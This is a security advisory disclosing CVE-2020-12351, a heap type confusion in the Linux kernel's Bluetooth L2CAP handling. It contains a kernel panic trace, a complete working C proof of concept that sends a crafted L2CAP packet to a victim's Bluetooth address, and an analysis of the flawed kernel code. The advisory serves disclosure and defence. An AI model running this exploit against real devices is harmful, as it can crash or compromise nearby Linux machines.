---
title: 'Linux: Heap-Based Type Confusion in L2CAP (BleedingTooth)'
severity: High
ghsa_id: GHSA-h637-c88j-47wq
cve_id: CVE-2020-12351
weaknesses: []
products:
- ecosystem: ''
  package_name: linux
  affected_versions: '>= 4.8'
  patched_versions: ''
cvss: null
credits:
- github_user_id: TheOfficialFloW
  name: Andy Nguyen
  avatar: https://avatars.githubusercontent.com/u/14246466?s=40&v=4
---

# BadKarma: Heap-Based Type Confusion (BleedingTooth)

## Summary

A heap-based type confusion affecting Linux kernel 4.8 and higher was discovered in `net/bluetooth/l2cap_core.c`.

## Severity

*High*

A remote attacker in short distance knowing the victim's bd address can send a malicious l2cap packet and cause denial of service or possibly arbitrary code execution with kernel privileges. Malicious Bluetooth chips can trigger the vulnerability as well.

## Proof Of Concept

Compile the code below using `gcc -o poc poc.c -lbluetooth` and run as `sudo ./poc 11:22:33:44:55:66`.

The following panic has been observed on Ubuntu 20.04 LTS:

```
[  445.440736] general protection fault: 0000 [#1] SMP PTI
[  445.440740] CPU: 4 PID: 483 Comm: kworker/u17:1 Not tainted 5.4.0-40-generic #44-Ubuntu
[  445.440741] Hardware name: Dell Inc. XPS 15 7590/0CF6RR, BIOS 1.7.0 05/11/2020
[  445.440764] Workqueue: hci0 hci_rx_work [bluetooth]
[  445.440771] RIP: 0010:sk_filter_trim_cap+0x6d/0x220
[  445.440773] Code: e8 18 e1 af ff 41 89 c5 85 c0 75 62 48 8b 83 10 01 00 00 48 85 c0 74 56 49 8b 4c 24 18 49 89 5c 24 18 4c 8b 78 18 48 89 4d b0 <41> f6 47 02 08 0f 85 41 01 00 00 0f 1f 44 00 00 49 8b 47 30 49 8d
[  445.440776] RSP: 0018:ffffa86b403abca0 EFLAGS: 00010286
[  445.440778] RAX: ffffffffc071cc50 RBX: ffff8e95af6d7000 RCX: 0000000000000000
[  445.440780] RDX: 0000000000000000 RSI: ffff8e95ac533800 RDI: ffff8e95af6d7000
[  445.440781] RBP: ffffa86b403abd00 R08: ffff8e95b452f0e0 R09: ffff8e95b34072c0
[  445.440782] R10: ffff8e95acd57818 R11: ffff8e95b456ae38 R12: ffff8e95ac533800
[  445.440784] R13: 0000000000000000 R14: 0000000000000001 R15: 30478b4800000208
[  445.440786] FS:  0000000000000000(0000) GS:ffff8e95b4500000(0000) knlGS:0000000000000000
[  445.440788] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  445.440789] CR2: 000055f371aa94a8 CR3: 000000022dc0a005 CR4: 00000000003606e0
[  445.440791] Call Trace:
[  445.440817]  ? __l2cap_chan_add+0x88/0x1c0 [bluetooth]
[  445.440838]  l2cap_data_rcv+0x351/0x510 [bluetooth]
[  445.440857]  l2cap_data_channel+0x29f/0x470 [bluetooth]
[  445.440875]  l2cap_recv_frame+0xe5/0x300 [bluetooth]
[  445.440878]  ? skb_release_all+0x26/0x30
[  445.440896]  l2cap_recv_acldata+0x2d2/0x2e0 [bluetooth]
[  445.440914]  hci_rx_work+0x186/0x360 [bluetooth]
[  445.440919]  process_one_work+0x1eb/0x3b0
[  445.440921]  worker_thread+0x4d/0x400
[  445.440924]  kthread+0x104/0x140
[  445.440927]  ? process_one_work+0x3b0/0x3b0
[  445.440929]  ? kthread_park+0x90/0x90
[  445.440932]  ret_from_fork+0x35/0x40
```

### poc.c

```c
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <bluetooth/bluetooth.h>
#include <bluetooth/l2cap.h>
#include <bluetooth/hci.h>
#include <bluetooth/hci_lib.h>

#define AMP_MGR_CID 0x03

static uint16_t crc16_tab[256] = {
  0x0000, 0xc0c1, 0xc181, 0x0140, 0xc301, 0x03c0, 0x0280, 0xc241,
  0xc601, 0x06c0, 0x0780, 0xc741, 0x0500, 0xc5c1, 0xc481, 0x0440,
  0xcc01, 0x0cc0, 0x0d80, 0xcd41, 0x0f00, 0xcfc1, 0xce81, 0x0e40,
  0x0a00, 0xcac1, 0xcb81, 0x0b40, 0xc901, 0x09c0, 0x0880, 0xc841,
  0xd801, 0x18c0, 0x1980, 0xd941, 0x1b00, 0xdbc1, 0xda81, 0x1a40,
  0x1e00, 0xdec1, 0xdf81, 0x1f40, 0xdd01, 0x1dc0, 0x1c80, 0xdc41,
  0x1400, 0xd4c1, 0xd581, 0x1540, 0xd701, 0x17c0, 0x1680, 0xd641,
  0xd201, 0x12c0, 0x1380, 0xd341, 0x1100, 0xd1c1, 0xd081, 0x1040,
  0xf001, 0x30c0, 0x3180, 0xf141, 0x3300, 0xf3c1, 0xf281, 0x3240,
  0x3600, 0xf6c1, 0xf781, 0x3740, 0xf501, 0x35c0, 0x3480, 0xf441,
  0x3c00, 0xfcc1, 0xfd81, 0x3d40, 0xff01, 0x3fc0, 0x3e80, 0xfe41,
  0xfa01, 0x3ac0, 0x3b80, 0xfb41, 0x3900, 0xf9c1, 0xf881, 0x3840,
  0x2800, 0xe8c1, 0xe981, 0x2940, 0xeb01, 0x2bc0, 0x2a80, 0xea41,
  0xee01, 0x2ec0, 0x2f80, 0xef41, 0x2d00, 0xedc1, 0xec81, 0x2c40,
  0xe401, 0x24c0, 0x2580, 0xe541, 0x2700, 0xe7c1, 0xe681, 0x2640,
  0x2200, 0xe2c1, 0xe381, 0x2340, 0xe101, 0x21c0, 0x2080, 0xe041,
  0xa001, 0x60c0, 0x6180, 0xa141, 0x6300, 0xa3c1, 0xa281, 0x6240,
  0x6600, 0xa6c1, 0xa781, 0x6740, 0xa501, 0x65c0, 0x6480, 0xa441,
  0x6c00, 0xacc1, 0xad81, 0x6d40, 0xaf01, 0x6fc0, 0x6e80, 0xae41,
  0xaa01, 0x6ac0, 0x6b80, 0xab41, 0x6900, 0xa9c1, 0xa881, 0x6840,
  0x7800, 0xb8c1, 0xb981, 0x7940, 0xbb01, 0x7bc0, 0x7a80, 0xba41,
  0xbe01, 0x7ec0, 0x7f80, 0xbf41, 0x7d00, 0xbdc1, 0xbc81, 0x7c40,
  0xb401, 0x74c0, 0x7580, 0xb541, 0x7700, 0xb7c1, 0xb681, 0x7640,
  0x7200, 0xb2c1, 0xb381, 0x7340, 0xb101, 0x71c0, 0x7080, 0xb041,
  0x5000, 0x90c1, 0x9181, 0x5140, 0x9301, 0x53c0, 0x5280, 0x9241,
  0x9601, 0x56c0, 0x5780, 0x9741, 0x5500, 0x95c1, 0x9481, 0x5440,
  0x9c01, 0x5cc0, 0x5d80, 0x9d41, 0x5f00, 0x9fc1, 0x9e81, 0x5e40,
  0x5a00, 0x9ac1, 0x9b81, 0x5b40, 0x9901, 0x59c0, 0x5880, 0x9841,
  0x8801, 0x48c0, 0x4980, 0x8941, 0x4b00, 0x8bc1, 0x8a81, 0x4a40,
  0x4e00, 0x8ec1, 0x8f81, 0x4f40, 0x8d01, 0x4dc0, 0x4c80, 0x8c41,
  0x4400, 0x84c1, 0x8581, 0x4540, 0x8701, 0x47c0, 0x4680, 0x8641,
  0x8201, 0x42c0, 0x4380, 0x8341, 0x4100, 0x81c1, 0x8081, 0x4040
};

uint16_t crc16(uint16_t crc, const void *buf, size_t size) {
  const uint8_t *p;

  p = buf;

  while (size--)
    crc = crc16_tab[(crc ^ (*p++)) & 0xFF] ^ (crc >> 8);

  return crc;
}

int hci_send_acl_data(int hci_socket, uint16_t hci_handle, void *data, uint16_t data_length) {
  uint8_t type = HCI_ACLDATA_PKT;
  uint16_t BCflag = 0x0000;
  uint16_t PBflag = 0x0002;
  uint16_t flags = ((BCflag << 2) | PBflag) & 0x000F;

  hci_acl_hdr hdr;
  hdr.handle = htobs(acl_handle_pack(hci_handle, flags));
  hdr.dlen = data_length;

  struct iovec iv[3];

  iv[0].iov_base = &type;
  iv[0].iov_len = 1;
  iv[1].iov_base = &hdr;
  iv[1].iov_len = HCI_ACL_HDR_SIZE;
  iv[2].iov_base = data;
  iv[2].iov_len = data_length;

  return writev(hci_socket, iv, sizeof(iv) / sizeof(struct iovec));
}

int main(int argc, char **argv) {
  if (argc != 2) {
    printf("Usage: %s MAC_ADDR\n", argv[0]);
    return 1;
  }

  bdaddr_t dst_addr;
  str2ba(argv[1], &dst_addr);

  printf("[*] Resetting hci0 device...\n");
  system("sudo hciconfig hci0 down");
  system("sudo hciconfig hci0 up");

  printf("[*] Opening hci device...\n");
  struct hci_dev_info di;
  int hci_device_id = hci_get_route(NULL);
  int hci_socket = hci_open_dev(hci_device_id);
  if (hci_devinfo(hci_device_id, &di) < 0) {
    perror("hci_devinfo");
    return 1;
  }

  struct hci_filter flt;
  hci_filter_clear(&flt);
  hci_filter_all_ptypes(&flt);
  hci_filter_all_events(&flt);
  if (setsockopt(hci_socket, SOL_HCI, HCI_FILTER, &flt, sizeof(flt)) < 0) {
    perror("setsockopt(HCI_FILTER)");
    return 1;
  }

  int opt = 1;
  if (setsockopt(hci_socket, SOL_HCI, HCI_DATA_DIR, &opt, sizeof(opt)) < 0) {
    perror("setsockopt(HCI_DATA_DIR)");
    return 1;
  }

  printf("[*] Connecting to victim...\n");

  struct sockaddr_l2 laddr = {0};
  laddr.l2_family = AF_BLUETOOTH;
  laddr.l2_bdaddr = di.bdaddr;

  struct sockaddr_l2 raddr = {0};
  raddr.l2_family = AF_BLUETOOTH;
  raddr.l2_bdaddr = dst_addr;

  int l2_sock;

  if ((l2_sock = socket(PF_BLUETOOTH, SOCK_RAW, BTPROTO_L2CAP)) < 0) {
    perror("socket");
    return 1;
  }

  if (bind(l2_sock, (struct sockaddr *)&laddr, sizeof(laddr)) < 0) {
    perror("bind");
    return 1;
  }

  if (connect(l2_sock, (struct sockaddr *)&raddr, sizeof(raddr)) < 0) {
    perror("connect");
    return 1;
  }

  struct l2cap_conninfo l2_conninfo;
  socklen_t l2_conninfolen = sizeof(l2_conninfo);
  if (getsockopt(l2_sock, SOL_L2CAP, L2CAP_CONNINFO, &l2_conninfo, &l2_conninfolen) < 0) {
    perror("getsockopt");
    return 1;
  }

  uint16_t hci_handle = l2_conninfo.hci_handle;
  printf("[+] HCI handle: %x\n", hci_handle);

  printf("[*] Sending malicious L2CAP packet...\n");
  struct {
    l2cap_hdr hdr;
    uint16_t ctrl;
    uint16_t fcs;
  } packet = {0};
  packet.hdr.len = htobs(sizeof(packet) - L2CAP_HDR_SIZE);
  packet.hdr.cid = htobs(AMP_MGR_CID);
  packet.fcs = crc16(0, &packet, sizeof(packet) - 2);
  hci_send_acl_data(hci_socket, hci_handle, &packet, sizeof(packet));

  close(l2_sock);
  hci_close_dev(hci_socket);

  return 0;
}
```

## Analysis

The vulnerability was introduced in [commit dbb50887c8f619fc5c3489783ebc3122bc134a31](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/net/bluetooth/l2cap_core.c?id=dbb50887c8f619fc5c3489783ebc3122bc134a31).

When specifying a CID different than `L2CAP_CID_SIGNALING`, `L2CAP_CID_CONN_LESS` or `L2CAP_CID_LE_SIGNALING`, the subroutine `l2cap_data_channel()` is invoked. If the channel mode is `L2CAP_MODE_ERTM` or `L2CAP_MODE_STREAMING`, it calls `l2cap_data_rcv()`.

```c
static void l2cap_data_channel(struct l2cap_conn *conn, u16 cid,
			       struct sk_buff *skb)
{
	struct l2cap_chan *chan;

	chan = l2cap_get_chan_by_scid(conn, cid);
	if (!chan) {
		if (cid == L2CAP_CID_A2MP) {
			chan = a2mp_channel_create(conn, skb);
			if (!chan) {
				kfree_skb(skb);
				return;
			}

			l2cap_chan_lock(chan);
		} else {
			BT_DBG("unknown cid 0x%4.4x", cid);
			/* Drop packet and return */
			kfree_skb(skb);
			return;
		}
	}
	...
	switch (chan->mode) {
	...
	case L2CAP_MODE_ERTM:
	case L2CAP_MODE_STREAMING:
		l2cap_data_rcv(chan, skb);
		goto done;
	...
	}

drop:
	kfree_skb(skb);

done:
	l2cap_chan_unlock(chan);
}
```

then, the packet's checksum is verified and if it matches, it continues to doing `sk_filter()`.

```c
static int l2cap_data_rcv(struct l2cap_chan *chan, struct sk_buff *skb)
{
	struct l2cap_ctrl *control = &bt_cb(skb)->l2cap;
	u16 len;
	u8 event;

	__unpack_control(chan, skb);

	len = skb->len;

	/*
	 * We can just drop the corrupted I-frame here.
	 * Receiver will miss it and start proper recovery
	 * procedures and ask for retransmission.
	 */
	if (l2cap_check_fcs(chan, skb))
		goto drop;

	if (!control->sframe && control->sar == L2CAP_SAR_START)
		len -= L2CAP_SDULEN_SIZE;

	if (chan->fcs == L2CAP_FCS_CRC16)
		len -= L2CAP_FCS_SIZE;

	if (len > chan->mps) {
		l2cap_send_disconn_req(chan, ECONNRESET);
		goto drop;
	}

	if ((chan->mode == L2CAP_MODE_ERTM ||
	     chan->mode == L2CAP_MODE_STREAMING) && sk_filter(chan->data, skb))
		goto drop;
	...
}
```

Note that when using CID `L2CAP_CID_A2MP` and there is not yet a channel, `a2mp_channel_create()` is invoked.

```c
static struct amp_mgr *amp_mgr_create(struct l2cap_conn *conn, bool locked)
{
	struct amp_mgr *mgr;
	struct l2cap_chan *chan;

	mgr = kzalloc(sizeof(*mgr), GFP_KERNEL);
	if (!mgr)
		return NULL;

	BT_DBG("conn %p mgr %p", conn, mgr);

	mgr->l2cap_conn = conn;

	chan = a2mp_chan_open(conn, locked);
	if (!chan) {
		kfree(mgr);
		return NULL;
	}

	mgr->a2mp_chan = chan;
	chan->data = mgr;
	...
	return mgr;
}
```

where `a2mp_chan_open()` creates a channel and in particular initializes with mode `L2CAP_MODE_ERTM`.

```c
static struct l2cap_chan *a2mp_chan_open(struct l2cap_conn *conn, bool locked)
{
	struct l2cap_chan *chan;
	int err;

	chan = l2cap_chan_create();
	if (!chan)
		return NULL;

	BT_DBG("chan %p", chan);

	chan->chan_type = L2CAP_CHAN_FIXED;
	chan->scid = L2CAP_CID_A2MP;
	chan->dcid = L2CAP_CID_A2MP;
	...
	chan->mode = L2CAP_MODE_ERTM;
	...
	return chan;
}
```

From `amp_mgr_create()` we note that the field `chan->data` is of type `struct amp_mgr` and from `l2cap_data_rcv()` we see that it's calling `sk_filter()` with that as argument.

```c
	if ((chan->mode == L2CAP_MODE_ERTM ||
	     chan->mode == L2CAP_MODE_STREAMING) && sk_filter(chan->data, skb))
		goto drop;
```

Now, the function is

```c
int sk_filter(struct sock *sk, struct sk_buff *skb);
```

therefore, `chan->data` should actually be of type `struct sock`.

The design issue causing this confusion is due to `chan->data` being used for arbitrary data. In `net/bluetooth/l2cap_sock.c` for example, `chan->data` is of type `struct sock` and that's what this commit only considered.